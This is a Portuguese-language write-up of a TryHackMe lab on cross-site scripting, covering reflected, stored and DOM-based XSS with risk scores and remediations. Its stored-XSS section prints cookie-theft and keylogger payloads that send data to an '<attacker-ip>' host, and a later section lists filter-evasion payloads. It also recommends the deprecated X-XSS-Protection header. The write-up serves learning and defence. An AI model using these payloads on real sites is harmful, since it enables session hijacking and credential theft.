# TryHackMe — Advanced XSS Research Lab

Repositório criado para documentar a resolução prática e a análise técnica do laboratório de Cross-Site Scripting (XSS) avançado na plataforma TryHackMe. O objetivo do desafio foi explorar em profundidade os três vetores de XSS — Reflected, Stored e DOM-Based — aplicando técnicas de evasão de filtros e validando falhas classificadas no framework OWASP Top 10 (2021).

---

## Stack Utilizada

| Componente | Detalhe |
|---|---|
| **Sistema Operacional** | Kali Linux |
| **Conectividade** | OpenVPN (Interface `tun0`) |
| **IP do Alvo** | `10.64.162.16` |
| **Plataforma** | TryHackMe — Room: `axss` |
| **Duração Estimada** | 120 minutos |
| **Dificuldade** | Easy |
| **Metodologia de Segurança** | PTES (Penetration Testing Execution Standard) |
| **Framework Web** | OWASP Top 10 (2021) — A03: Injection |

---

## Resolução e Análise Prática — Task por Task

### Task 1 & 2 — Introduction & Terminology

O room introduz o contexto histórico do XSS, cuja primeira vulnerabilidade reconhecida remonta a 1999 (CERT Advisory CA-2000-02), e define a taxonomia dos três tipos principais de ataque:

- **Reflected XSS** — O payload não é persistido; é refletido imediatamente na resposta HTTP e executado no navegador da vítima.
- **Stored XSS** — O payload é armazenado em banco de dados e executado em qualquer cliente que renderize o conteúdo afetado.
- **DOM-Based XSS** — A execução acontece inteiramente no lado cliente, sem envolvimento do servidor; fontes (`sources`) como `window.location` alimentam sinks inseguros como `innerHTML`.

No OWASP Top 10, XSS foi classificado como **#7 em 2017** e, em 2021, foi agrupado sob **A03:2021 — Injection**, subindo para a terceira posição.

---

### Task 3 — Causes and Implications

Analisei as causas raiz que tornam aplicações vulneráveis a XSS:

#### Causas Identificadas

| Causa | Descrição Técnica |
|---|---|
| **Ausência de Output Encoding** | Dados do usuário renderizados diretamente no HTML sem codificação de entidades (`<`, `>`, `"`, `'`, `&`) |
| **Validação apenas Client-Side** | Filtros implementados em JavaScript no front-end são trivialmente bypassáveis via DevTools ou Burp Suite |
| **Configuração incorreta de headers** | Ausência ou má configuração de `Content-Security-Policy (CSP)` e `X-Content-Type-Options` |
| **Sinks DOM inseguros** | Uso de `innerHTML`, `document.write()`, `eval()` com dados não sanitizados |

#### Implicações de Segurança

- Roubo de sessão via `document.cookie`
- Redirecionamento para páginas maliciosas (`document.location`)
- Keylogging e captura de credenciais em formulários
- Defacement e manipulação do DOM
- Ataques de phishing dentro do domínio legítimo (bypass de Same-Origin Policy)

---

### Task 4 — Reflected XSS

#### Vetor de Ataque

O Reflected XSS ocorre quando dados fornecidos via parâmetros de URL ou formulários são inseridos diretamente na resposta HTTP sem sanitização.

**Ponto de entrada identificado:** Parâmetro de query string em campo de busca/erro da aplicação.

#### Payloads Executados

```html
<!-- Proof of Concept básico -->
<script>alert('XSS')</script>

<!-- Exfiltração de hostname -->
<script>alert(window.location.hostname)</script>

<!-- Exfiltração de cookies de sessão -->
<script>alert(document.cookie)</script>
```

#### Metodologia Aplicada

1. Identificação de todos os pontos de entrada de dados do usuário (query strings, formulários)
2. Injeção de payloads de PoC para confirmar reflexão não sanitizada
3. Escalada para payloads de impacto real (session hijacking)
4. Confirmação visual da execução no browser

#### Análise de Risco

| Atributo | Detalhe |
|---|---|
| **CVSS v3.1 Score** | **6.1** (Medium) |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
| **OWASP 2021** | **A03 — Injection** |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **Severidade** | Média |

---

### Task 5 — Vulnerable Web Application 1 (Reflected XSS Lab)

Exploração prática em ambiente controlado de Reflected XSS. Analisei o código-fonte da aplicação para mapear onde o input do usuário era inserido na resposta sem sanitização.

**Sink vulnerável identificado:** Parâmetro refletido diretamente em contexto HTML, sem encoding de entidades.

```php
// Código PHP vulnerável (exemplo da aplicação)
echo "Resultado para: " . $_GET['search'];
// Ausência de htmlspecialchars() ou equivalente
```

**Remediação recomendada:**
```php
echo "Resultado para: " . htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');
```

---

### Task 6 — Stored XSS

#### Vetor de Ataque

O Stored XSS persiste o payload no banco de dados da aplicação, tornando-o executável para **todos os usuários** que visualizarem o conteúdo afetado — incluindo administradores autenticados.

**Ponto de entrada identificado:** Campo de comentários ou reviews da aplicação sem validação server-side.

#### Payloads Executados

```html
<!-- PoC básico persistido -->
<script>alert('Stored XSS')</script>

<!-- Session Hijacking com exfiltração de cookie -->
<script>document.location='http://<attacker-ip>/log/'+document.cookie</script>

<!-- Keylogger básico -->
<script>
document.onkeypress = function(e) {
  new Image().src = 'http://<attacker-ip>/log?k=' + e.key;
}
</script>
```

#### Análise de Risco

| Atributo | Detalhe |
|---|---|
| **CVSS v3.1 Score** | **8.8** (High) |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` |
| **OWASP 2021** | **A03 — Injection** |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **Severidade** | Alta |

> **Nota:** O Stored XSS recebe CVSS mais elevado que o Reflected pois não requer que a vítima acesse um link malicioso — o payload se auto-executa para qualquer usuário que visite a página comprometida.

---

### Task 7 — Vulnerable Web Application 2 (Stored XSS Lab)

Exploração prática em ambiente controlado (`AXSS-Stored-v0.2`, IP: `10.64.162.16`). Executei o ataque completo de session hijacking:

1. Injeti o payload de exfiltração de cookie no campo vulnerável
2. Monitorei requisições chegando ao listener de captura
3. Confirmei a captura do cookie de sessão de outro usuário da aplicação
4. Validei que o payload persistia e re-executava a cada carregamento da página

**Remediação aplicada (análise de código):**
- Implementação de `htmlspecialchars()` / `html.escape()` no output
- Validação e sanitização server-side com allowlists
- Configuração de `Content-Security-Policy: default-src 'self'`
- Flag `HttpOnly` nos cookies de sessão para bloquear acesso via `document.cookie`

---

### Task 8 — DOM-Based XSS

#### Vetor de Ataque

O DOM-Based XSS é único pois o servidor **nunca processa o payload** — a vulnerabilidade existe inteiramente no JavaScript client-side. Uma `source` insegura alimenta um `sink` perigoso sem sanitização.

**Fontes (Sources) analisadas:**
- `window.location.hash`
- `window.location.search`
- `document.referrer`
- `window.name`

**Sinks (Sinks) vulneráveis identificados:**
- `innerHTML`
- `document.write()`
- `eval()`
- `setTimeout()` / `setInterval()` com string

#### Payload Executado

```javascript
// Exploração via URL fragment (#)
// URL: http://alvo.thm/page#<img src=x onerror=alert(document.cookie)>

// Código vulnerável na aplicação
document.getElementById('output').innerHTML = window.location.hash.substring(1);
// innerHTML é um sink inseguro — executa HTML/JS arbitrário
```

**Remediação recomendada:**
```javascript
// Substituir innerHTML por textContent (não interpreta HTML)
document.getElementById('output').textContent = window.location.hash.substring(1);
```

#### Análise de Risco

| Atributo | Detalhe |
|---|---|
| **CVSS v3.1 Score** | **6.1** (Medium) |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
| **OWASP 2021** | **A03 — Injection** |
| **CWE** | CWE-79 / CWE-116 |
| **Severidade** | Média |

---

### Task 9 — Context and Evasion (Bypass de Filtros)

Explorei técnicas de evasão contra filtros básicos de XSS, analisando o contexto de injeção para adaptar o payload:

#### Contextos de Injeção Analisados

| Contexto | Exemplo de Sink | Técnica de Evasão |
|---|---|---|
| **HTML body** | `<div>INPUT</div>` | Tags diretas: `<script>`, `<img onerror=>` |
| **HTML attribute** | `<input value="INPUT">` | Fechar atributo: `"><script>alert(1)</script>` |
| **HTML comment** | `<!-- INPUT -->` | Escapar comentário: `--><script>alert(1)</script>` |
| **JavaScript string** | `var x = 'INPUT';` | Fechar string: `';alert(1);//` |

#### Payloads de Evasion Testados

```html
<!-- Evasão de filtro de <script> tag -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Evasão de filtro de aspas -->
<img src=x onerror=alert`1`>

<!-- Evasão de filtro case-sensitive -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Evasão com encoding HTML -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- Evasão de contexto JavaScript -->
';alert(document.cookie);//
\';alert(1);//
```

---

## Consolidação das Vulnerabilidades

| # | Tipo | CVSS v3.1 | Severidade | OWASP 2021 | CWE |
|---|---|---|---|---|---|
| 1 | Reflected XSS | 6.1 | **Média** | A03 — Injection | CWE-79 |
| 2 | Stored XSS | 8.8 | **Alta** | A03 — Injection | CWE-79 |
| 3 | DOM-Based XSS | 6.1 | **Média** | A03 — Injection | CWE-79 / CWE-116 |

---

## Impacto de Negócio

A exploração combinada das três variantes de XSS gera um cenário de comprometimento crítico para qualquer aplicação web:

**Comprometimento de Sessão e Identidade (Stored XSS — Criticidade Máxima):**
O Stored XSS representa o vetor de maior impacto: um único payload injetado em um campo de comentários ou review compromete **todos os usuários** que visitarem a página — incluindo administradores com sessões ativas de alto privilégio. Um atacante pode exfiltrar cookies de sessão via `document.cookie`, sequestrar contas sem necessidade de credenciais e executar ações administrativas destrutivas em nome da vítima.

**Engenharia Social no Domínio Legítimo (Reflected XSS):**
O Reflected XSS entregue via link malicioso é particularmente eficaz contra phishing direcionado: como a execução ocorre dentro do domínio legítimo da aplicação, ferramentas de segurança baseadas em reputação de domínio falham em detectar o ataque. Usuários treinados para verificar a URL do site são bypassados pela própria confiança no domínio.

**Ataques Sem Rastro Server-Side (DOM-Based XSS):**
O DOM-Based XSS representa um desafio único de detecção: como o payload nunca chega ao servidor, firewalls de aplicação web (WAF) e logs server-side são ineficazes. O ataque vive e morre inteiramente no browser da vítima, tornando-o ideal para exfiltração silenciosa de dados de sessão.

---

## Remediações Recomendadas

| Controle | Implementação |
|---|---|
| **Output Encoding** | `htmlspecialchars()` (PHP), `html.escape()` (Python), `HtmlEncoder` (.NET) em todo output de dados do usuário |
| **Content Security Policy** | `Content-Security-Policy: default-src 'self'; script-src 'self'` para bloquear scripts inline e de origens externas |
| **HttpOnly Cookie Flag** | `Set-Cookie: session=...; HttpOnly` para impedir acesso ao cookie via `document.cookie` |
| **Validação Server-Side** | Allowlists de caracteres permitidos; nunca confiar em validação client-side |
| **Sinks DOM Seguros** | Substituir `innerHTML` por `textContent`; evitar `eval()`, `document.write()` |
| **X-XSS-Protection Header** | `X-XSS-Protection: 1; mode=block` como camada adicional de defesa |

---

## Conclusão Extraída da Experiência

A conclusão deste laboratório consolida uma visão técnica de que a superfície de ataque de XSS é profundamente dependente do **contexto de injeção** — o mesmo payload pode ser ineficaz em um contexto HTML e devastador em um contexto JavaScript. A maturidade técnica real se manifesta na capacidade de analisar o código-fonte da aplicação, identificar onde os dados do usuário fluem sem sanitização, e adaptar o payload para o sink específico.

Ao correlacionar cada variante de XSS com seus scores CVSS e os riscos de negócio reais, este laboratório deixa de ser um exercício mecânico de `alert(1)` e passa a ser uma simulação legítima das fases de Análise de Vulnerabilidades e Exploração do framework PTES — fornecendo a base técnica necessária para auditar e defender aplicações web modernas contra um dos vetores de ataque mais persistentes da história da segurança ofensiva.

---

*Documentação produzida para fins educacionais no contexto do TryHackMe Room: [Advanced XSS](https://tryhackme.com/room/axss) — 100% completado.*
